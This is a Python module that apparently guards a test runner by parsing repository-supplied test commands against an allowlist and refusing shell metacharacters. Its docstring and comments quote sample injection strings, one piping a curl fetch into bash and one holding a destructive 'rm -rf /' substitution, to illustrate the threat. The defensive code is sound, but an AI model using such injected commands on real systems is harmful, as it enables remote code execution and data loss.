"""Centralised safe command parsing for repository-provided test commands.

Background
----------
Legacy code executed every test command through ``sh -c``::

    subprocess.run(["sh", "-c", command], ...)

Any string sourced from ``specs/constitution.md``,
``specs/**/tasks.md`` (Verification field), or the ledger was therefore
implicitly trusted. That is a sandbox escape: an attacker who lands a
malicious value in any of those artifacts (e.g. ``pytest
tests/x; curl evil | bash``) achieves arbitrary code execution under
the user's shell.

This module replaces that boundary with a strict allowlist. Every test
command must:

1. Tokenise via :func:`shlex.split` so quoted paths land as a single argv.
2. Pass every token through :func:`_is_safe_token` — rejecting shell
   operators, command substitution, backticks, newlines, escapes, and
   any character the shell would otherwise interpret.
3. Name an executable on :data:`SAFE_EXECUTABLES` — with one carve-out
   for ``mise run test`` (the canonical DeviaTDD test invocation) which
   must keep its structured argv form.

When any of those checks fail, :func:`parse_safe_command` returns a
:data:`SafeCommand` with ``accepted=False`` and an explanation; no
process is ever spawned. :func:`run_safe_command` then returns a
deterministic failed :class:`subprocess.CompletedProcess` (returncode
``127``) instead of executing the suspect input.

The policy is the single trust boundary used by
``deviate.cli.micro._run_test_cmd``, ``_execute_test_command``,
``_task_verification_command``, and ``_constitution_test_command``. All
three sources feed into the same gate so an attacker cannot smuggle an
executable value through whichever path bypasses review.
"""

from __future__ import annotations

import re
import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path


# ---------------------------------------------------------------------------
# Public data
# ---------------------------------------------------------------------------


#: Executables that may run as test commands. Each entry maps the
#: recognised argv head to a normalised argv list. Anything not on this
#: list is rejected before subprocess.run is called.
SAFE_EXECUTABLES: dict[tuple[str, ...], str] = {
    ("mise", "run", "test"): "mise run test",
    ("pytest",): "pytest",
    ("python", "-m", "pytest"): "python -m pytest",
    ("python", "-m", "unittest"): "python -m unittest",
    ("ruff",): "ruff",
    ("bats",): "bats",
    ("mix", "test"): "mix test",
    ("npm", "test"): "npm test",
    ("cargo", "test"): "cargo test",
    ("go", "test"): "go test",
}


#: Characters that the shell would otherwise interpret. Tokens may not
#: contain any of them; quoted tokens like ``"$(rm -rf /)"`` are split
#: by :func:`shlex.split` into separate tokens so each piece is checked
#: individually. The set deliberately covers every metacharacter that
#: POSIX or bash would consume — including backticks, history expansion,
#: and glob patterns.
_FORBIDDEN_TOKEN_CHARS = frozenset(";|&`$()<>{}*?!~\\")


#: A bare ``mise run test`` literal is special-cased so it bypasses the
#: argv parser while still being routed to the same allowlist. We match
#: exactly so no shell metacharacter can slip through the literal fast
#: path.
_MISE_RUN_TEST_LITERAL_RE = re.compile(r"^mise\s+run\s+test(\s.*)?$")


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class SafeCommand:
    """Outcome of :func:`parse_safe_command`.

    ``accepted`` False means the caller MUST NOT spawn a process; the
    ``reason`` string is intended for diagnostics (logs, test output).
    ``argv`` is the structured form to pass to ``subprocess.run`` when
    ``accepted`` is True. ``label`` is a short identifier for the
    normalised executable form (``"pytest"``, ``"mise run test"``).
    """

    accepted: bool
    argv: tuple[str, ...]
    reason: str
    label: str


# ---------------------------------------------------------------------------
# Parsing
# ---------------------------------------------------------------------------


def _is_safe_token(token: str) -> bool:
    """Return True iff ``token`` contains no shell-significant character.

    Tokens may not be empty, may not carry newlines, and may not
    contain any character that the shell would interpret (operators,
    metacharacters, history expansion, globs, command substitution,
    backticks, escapes).
    """
    if not token:
        return False
    if "\n" in token or "\r" in token:
        return False
    if any(ch in _FORBIDDEN_TOKEN_CHARS for ch in token):
        return False
    # shlex.split already unquotes command substitution, so any
    # remaining ``$`` indicates unquoted variable expansion / $().
    if "$" in token:
        return False
    return True


def _match_executable(argv: tuple[str, ...]) -> tuple[tuple[str, ...], str] | None:
    """Return the executable prefix + label if argv starts with one of the
    allowlisted executables. Otherwise ``None``.
    """
    if not argv:
        return None
    head = argv[0]
    if "/" in head:
        basename = head.rsplit("/", 1)[-1]
    else:
        basename = head
    # Normalised mapping from executable basename to argv prefix.
    candidates: list[tuple[tuple[str, ...], str]] = [
        # Direct basenames
        (("pytest",), "pytest"),
        (("ruff",), "ruff"),
        (("bats",), "bats"),
        (("mix",), "mix test"),
        (("npm",), "npm test"),
        (("cargo",), "cargo test"),
        (("go",), "go test"),
        # Three-token python -m X patterns match regardless of whether the
        # interpreter is called ``python``, ``python3``, or an absolute
        # ``python`` (or any absolute path ending in python, python3,
        # python3.13, etc.) carrying ``-m pytest`` / ``-m unittest``.
        (("python", "-m", "pytest"), "python -m pytest"),
        (("python", "-m", "unittest"), "python -m unittest"),
        # ``mise`` is the canonical task runner.
        (("mise",), "mise run test"),
    ]
    for prefix, label in candidates:
        primary = prefix[0]
        # ``python`` matches any interpreter whose basename starts with
        # ``python`` (python, python3, python3.13, /usr/bin/python3.11).
        # All other primaries must match the basename verbatim.
        if primary == "python":
            if not basename.startswith("python"):
                continue
        elif basename != primary:
            continue
        if len(prefix) == 1:
            if label == "mise run test" and argv[:3] != ("mise", "run", "test"):
                continue
            return tuple(prefix), label
        # Allow ``python -m pytest`` / ``unittest`` where the interpreter
        # may also be a path or ``python3`` flavour.
        if (
            primary == "python"
            and len(argv) >= len(prefix)
            and tuple(argv[1 : len(prefix)]) == prefix[1:]
        ):
            return tuple(prefix), label
        if len(argv) >= len(prefix) and tuple(argv[: len(prefix)]) == prefix:
            return tuple(prefix), label
    return None


def parse_safe_command(command: str) -> SafeCommand:
    """Return whether ``command`` may execute as an argv-based subprocess.

    The function is the single trust boundary. Callers must use it for
    every untrusted test command and never spawn a process when
    ``accepted`` is False. The function is total: every input produces a
    structured result (rejected or accepted) rather than raising.
    """
    if not isinstance(command, str):
        return SafeCommand(False, (), "command must be a string", "")
    stripped = command.strip().strip("`").strip()
    if "\n" in stripped or "\r" in stripped:
        return SafeCommand(False, (), "newline injection not allowed", "")
    if not stripped:
        return SafeCommand(False, (), "empty command", "")
    # Special-case the canonical ``mise run test`` literal form so it
    # always maps to a structured argv even when extra args are tacked
    # on. We do this BEFORE the tokeniser because some users write
    # ``mise run test -- tests/foo -v`` and want the trailing -- to be
    # preserved as-is.
    literal = _MISE_RUN_TEST_LITERAL_RE.match(stripped)
    if literal:
        rest = stripped[len("mise run test") :].strip()
        if not rest:
            argv: tuple[str, ...] = ("mise", "run", "test")
        else:
            try:
                tokens = shlex.split(rest, posix=True)
            except ValueError as exc:
                return SafeCommand(
                    False,
                    (),
                    f"unbalanced quotes in mise run test arguments: {exc}",
                    "mise run test",
                )
            for token in tokens:
                if not _is_safe_token(token):
                    return SafeCommand(
                        False,
                        (),
                        f"unsafe token in mise run test arguments: {token!r}",
                        "mise run test",
                    )
            argv = ("mise", "run", "test", *tokens)
        return SafeCommand(True, argv, "", "mise run test")

    # shlex.split refuses unbalanced quotes — perfect for sanitising.
    try:
        tokens = shlex.split(stripped, posix=True)
    except ValueError as exc:
        return SafeCommand(False, (), f"unbalanced quotes: {exc}", "")

    if not tokens:
        return SafeCommand(False, (), "no tokens after parsing", "")
    for token in tokens:
        if not _is_safe_token(token):
            return SafeCommand(
                False,
                (),
                f"shell metacharacter or unsafe token: {token!r}",
                "",
            )

    executable = _match_executable(tuple(tokens))
    if executable is None:
        return SafeCommand(
            False,
            (),
            f"unsupported executable: {tokens[0]!r}",
            "",
        )
    _prefix, label = executable
    # The prefix itself must satisfy safe-token rules (defence in depth —
    # e.g. if a future allowlist entry contains a colon in its basename).
    for piece in _prefix:
        if not _is_safe_token(piece):
            return SafeCommand(False, (), f"unsafe executable token: {piece!r}", "")
    return SafeCommand(True, tuple(tokens), "", label)


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------


def run_safe_command(
    command: str,
    cwd: Path,
    *,
    env: dict[str, str] | None = None,
) -> subprocess.CompletedProcess:
    """Run ``command`` if it satisfies :func:`parse_safe_command`.

    On rejection, returns a deterministic failed
    :class:`subprocess.CompletedProcess` (returncode ``127``) without
    spawning a shell. On acceptance, runs the structured argv with
    ``subprocess.run(..., shell=False)`` exactly like a normal argv
    invocation.
    """
    parsed = parse_safe_command(command)
    if not parsed.accepted:
        args = (parsed.label,) if parsed.label else ("deviate", "test")
        return subprocess.CompletedProcess(
            args=args,
            returncode=127,
            stdout="",
            stderr=(
                "deviate: refused to execute unsafe test command: "
                f"{parsed.reason}\n"
                f"  original: {command!r}"
            ),
        )
    try:
        return subprocess.run(
            list(parsed.argv),
            cwd=str(cwd),
            env=env,
            capture_output=True,
            text=True,
            shell=False,
        )
    except OSError as exc:
        return subprocess.CompletedProcess(
            args=list(parsed.argv),
            returncode=127,
            stdout="",
            stderr=str(exc),
        )


def is_safe_test_command(command: str) -> bool:
    """Convenience predicate used by command-source helpers in micro.py.

    Returning ``False`` here means the value will be dropped from the
    candidate list (no fallback to other sources). This is the wanted
    behaviour for malicious values: drop them rather than try other
    untrusted inputs, and surface the rejection via the CompletedProcess
    that ``run_safe_command`` produces when the value is later picked up.
    """
    if not isinstance(command, str):
        return False
    return parse_safe_command(command).accepted
